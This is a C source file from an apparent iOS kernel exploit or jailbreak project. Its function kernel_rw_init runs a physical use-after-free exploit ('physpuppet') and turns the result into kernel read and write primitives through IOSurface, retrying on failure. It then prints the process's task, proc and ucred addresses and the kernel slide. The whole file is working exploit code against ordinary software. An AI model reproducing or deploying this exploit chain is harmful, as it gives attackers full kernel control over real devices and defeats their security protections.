#include "exploit.h"
#include "iosurface.h"
#include "puaf.h"
#include "offsets.h"
#include "info.h"
#include "libprejailbreak.h"

#include <time.h>

#define PUAF_PAGES 128
uint64_t puafPages[PUAF_PAGES];

int kernel_rw_init(void) {
    memset(puafPages, 0, PUAF_PAGES * sizeof(uint64_t));
    int nTries = 0;
    
    io_connect_t client = 0;
retry:
    iosurface_init(&client);
    copy_init();

    offsets_init();
    
    clock_t t = clock();
    nTries += 1;
    if (gOffsets.isArm64e) puaf_fill_ppl_free_list();
    physpuppet_run(PUAF_PAGES, puafPages);
    if (!puaf_check_free_pages(PUAF_PAGES, puafPages)) {
        printf("Failed to grab enough free pages\n");
        physpuppet_deinit(PUAF_PAGES, puafPages, 0);
        copy_deinit();
        if (nTries <= 5) goto retry;
        return -1; // Failed to grab enough free pages
    }
    
    uint64_t task = 0, puafPage = 0;
    int r = iosurface_krw(client, puafPages, PUAF_PAGES, &task, &puafPage);
    if (r) {
        printf("Failed to get IOSurface kernel r/w!\n");
        iosurface_deinit(puafPages);
        physpuppet_deinit(PUAF_PAGES, puafPages, 0);
        copy_deinit();
        if (nTries <= 5) goto retry;
        return r;
    }
    
    t = clock() - t;
    int time_taken_ms = ((double)t) / CLOCKS_PER_SEC * 1000.0;
    printf("Exploit succeeded in %d milliseconds!\n", time_taken_ms);
    
    // The rest of the primitives are up to the reader to complete
    gPrimitives.kread32 = iosurface_kread32;
    gPrimitives.kread64 = iosurface_kread64;
    gPrimitives.kwrite32 = iosurface_kwrite32;
    gPrimitives.kwrite64 = iosurface_kwrite64;
    gPrimitives.kwritebuf = iosurface_kwritebuf;
    gPrimitives.kreadbuf = iosurface_kreadbuf;
    
    if (info_init(task) != 0) {
        physpuppet_deinit(PUAF_PAGES, puafPages, puafPage);
        copy_deinit();
        iosurface_deinit(puafPages);
        return -1;
    }
    
    physpuppet_deinit(PUAF_PAGES, puafPages, puafPage);
    copy_deinit();
    
    printf("Our task: 0x%llX\n", task_self());
    printf("Our proc: 0x%llX\n", proc_self());
    printf("Our ucred: 0x%llX\n", ucred_self());
    printf("Kernel slide: 0x%llX\n", kinfo(slide));
    
    return 0;
}

void kernel_rw_deinit(void) {
    iosurface_deinit(puafPages);
}